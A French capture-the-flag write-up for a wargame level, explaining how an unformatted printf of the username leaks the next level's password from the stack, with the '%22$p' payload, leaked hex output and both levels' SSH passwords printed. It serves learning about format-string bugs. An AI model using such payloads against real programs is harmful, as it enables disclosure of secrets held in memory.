Le niveau précédent nous a donné le mot de passe SSH pour l’utilisateur `level02` :

`PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv`

Ici, le but est un peu différent des deux premiers niveaux. Cette fois, il ne s’agit pas d’exécuter du shellcode ni de bricoler un buffer overflow, mais d’abuser d’un format string (`printf`) utilisé sans protection. Le programme va lui‑même charger le mot de passe du `level03` en mémoire, puis nous le donner sans s’en rendre compte. À nous de lire correctement la mémoire.

## Connexion et premières observations

On se connecte en `level02`, et on trouve un binaire `/home/users/level02/level02`.  
Un rapide coup d’œil aux protections montre un environnement idéal pour jouer avec la mémoire :

```
No RELRO   No canary   NX disabled   No PIE
```

Pas de PIE → les adresses sont fixes.  
NX désactivé → la pile est exécutable (même si ici on n’en aura pas besoin).  
Pas de canary → aucun garde‐fou sur les buffers.

En lançant le programme :

```bash
./level02
===== [ Secure Access System v1.0 ] =====
--[ Username:
```

Il demande un username, puis un password, puis refuse l’accès.

## Analyse rapide du fonctionnement

Contrairement aux niveaux précédents, le début du programme lit directement le fichier `/home/users/level03/.pass`. Le contenu est mis dans un buffer local appelé `flag`. L’emplacement en assembleur est du style :

```asm
fopen("/home/users/level03/.pass", "r");
fread(flag, 1, 0x41, stream);
```

Ensuite, le programme lit deux inputs : `input1` (username) et `input2` (password).  
Il compare `input2` avec le contenu du flag :

```asm
strncmp(flag, input2, 41)
```

Si ça matche, il affiche “Greetings …” puis lance `/bin/sh`.  
Mais évidemment, sans connaître le flag, impossible.

Ce qui nous intéresse, c’est le cas où **le password est faux**.

Dans ce cas, il affiche :

```asm
printf(input1);
puts(" does not have access!");
```

Donc le `username` est directement donné comme **format string** à `printf`.  
Aucune validation. Aucun filtre. Si on met `%p`, `%x`, `%s`, on lit littéralement la stack.

C’est exactement ce qu’on voulait.

## Mise en évidence de la faille

On sait que :

- le flag du level03 est stocké sur la pile
- on peut lire la pile via `printf(user_input)`
- il suffit donc d’utiliser un format string comme `%22$p`, `%23$p`, etc.
- chaque `%p` lit un mot de 8 octets sur la stack
- le flag fait 41 caractères → environ 5 dumps suffisent

L’offset exact où se trouve le flag dépend de l’architecture mais, en local comme sur la VM du sujet, il se situe autour de l’argument 22.  
Donc un username comme :

```
%22$p.%23$p.%24$p.%25$p.%26$p
```

permet d’imprimer **cinq blocs de 8 octets** du flag.

Une fois convertis depuis l’hexadécimal, les blocs concaténés donnent le contenu du fichier `.pass`.

## Extraction du flag du level03

Voici les commandes exactes.

On lance :
```bash
./level02
--[ Username: %22$p.%23$p.%24$p.%25$p.%26$p
--[ Password: test
```

Le programme affiche quelque chose comme :
```
0x4868373452506e75.0x51397361354a4145.0x58674e5743717a37.0x7358476e68354a35.0x4d394b6650673348 does not have access!
```

Les adresses seront toujours identiques car le binaire n’est pas PIE.

On copie les cinq valeurs hexadécimales dans un mini script Python :

```bash
vim /tmp/exploit-lvl02.py
```

Le contenu du fichier d'exploit est dispo [ici](./exploit.py).

Puis :
```bash
python /tmp/exploit-lvl02.py
# resultat
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

C’est exactement le contenu du fichier `.pass` du level03.

Pas mal le level02, il est entièrement basé sur une faille classique de `printf` utilisé sans format : le programme charge le flag en mémoire, puis imprime directement notre entrée comme chaîne de format. En lui faisant lire la stack avec `%p`, on récupère morceau par morceau la valeur du flag, qu’on recompose ensuite en ASCII.

Le mot de passe SSH du level03 est donc :
`Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`
